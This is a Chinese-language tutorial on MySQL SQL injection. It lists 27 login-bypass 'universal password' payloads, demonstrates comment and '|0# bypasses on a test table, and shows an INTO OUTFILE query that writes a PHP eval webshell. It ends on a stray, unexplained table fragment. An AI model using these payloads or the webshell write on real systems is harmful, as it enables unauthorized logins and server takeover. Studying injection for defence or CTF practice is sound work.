0x00 再谈万能密码登陆

万能密码基本大家都用过，各种各样的，如下

  1. 'or 1=1/*
  2. "or "a"="a
  3. "or 1=1--
  4. "or"="
  5. "or"="a'='a
  6. "or1=1--
  7. "or=or"
  8. ''or'='or'
  9. ') or ('a'='a
  10. '.).or.('.a.'='.a
  11. 'or 1=1
  12. 'or 1=1--
  13. 'or 1=1/*
  14. 'or"="a'='a
  15. 'or' '1'='1'
  16. 'or''='
  17. 'or''=''or''='
  18. 'or'='1'
  19. 'or'='or'
  20. 'or.'a.'='a
  21. 'or1=1--
  22. 1'or'1'='1
  23. a'or' 1=1--
  24. a'or'1=1--
  25. or 'a'='a'
  26. or 1=1--
  27. or1=1--

其实根据前面的文章我们很容易看出 他的原理就是让我们的条件恒成立 至于为什么这么多种，就是根据语句的形势来闭合的，

这里面涉及到运算符的优先级，MySQL运算的特性，然后下面我们以几个例子来做做最另类的万能密码

  1. mysql> select * from admin where name = '/*' and pass = '*/';
  2. Empty set (0.00 sec)

注释绕过

  1. mysql> select * from admin where name = ''or 1=1-- ' and pass = '123';
  2.     -> ;
  3. +----+-----------+-------+
  4. | id | name      | pass  |
  5. +----+-----------+-------+
  6. |  1 | admin     | admin |
  7. |  2 | admin'111 | 11111 |
  8. |  3 | admin'111 | 11    |
  9. |  4 | admin'111 | 11    |
  10. +----+-----------+-------+
  11. 4 rows in set (0.00 sec)

经典的 or1=1-- 其中1=1恒为true 然后导致每条数据都成立返回

那么知道了这个原理怎么构造一个简单的万能密码呢

  1. mysql> select ''=0
  2.     -> ;
  3. +------+
  4. | ''=0 |
  5. +------+
  6. |    1 |
  7. +------+
  8. 1 row in set (0.00 sec)

  10. mysql> select 1=0=0;
  11. +-------+
  12. | 1=0=0 |
  13. +-------+
  14. |     1 |
  15. +-------+
  16. 1 row in set (0.30 sec)

我们可以看到在mysql中 空字符串'' 等于0 为1 也就是true 知道这个特性我们可以来构造我们的万能密码了

  1. mysql> select * from admin where name = ''|0#'  and pass = '123';
  2.     -> ;
  3. +----+-----------+-------+
  4. | id | name      | pass  |
  5. +----+-----------+-------+
  6. |  1 | admin     | admin |
  7. |  2 | admin'111 | 11111 |
  8. |  3 | admin'111 | 11    |
  9. |  4 | admin'111 | 11    |
  10. +----+-----------+-------+
  11. 4 rows in set, 5 warnings (0.00 sec)

仅仅用了 '|0# 个字符就能达到我们的效果 其他方法大家还可以测试,因为是自己发现的，然后问了几个师傅 发现ctf已经别人都用过了 ，不得不承认自己的知识量远远不够。

写文件

1.

写文件我们一般用到 dumpfile与 outfile 她们其实是有区别

outfile 会在行末写入新行，而且会转义换行符

dumpfile 能导出一个完整的文件，不会有任何转义 所以我们udf提取一般用的dumpfile

  1. mysql> select * from admin where id =1 union select 1,'<?php eval($_POST[cmd]);?>',3 into outfile 'G:\\test.txt';
  2. Query OK, 2 rows affected (0.00 sec)

后来大佬们找到一种方法通过日志来写shell解决这个史诗级难题，但是需要能直接执行sql语句利用有限

0x02 堆叠查询

mysql是支持堆叠查询的用 ; 分割语句,但是php原生的连接方式不支持，但是使用 PDO,mysqlimultiquery()等等是支持多语句的，在我们使用堆叠查询的时候基本是没有回显的，而且其实很难遇到这种环境。

  9. +----------------+
  10. | user()         |
  11. +----------------+
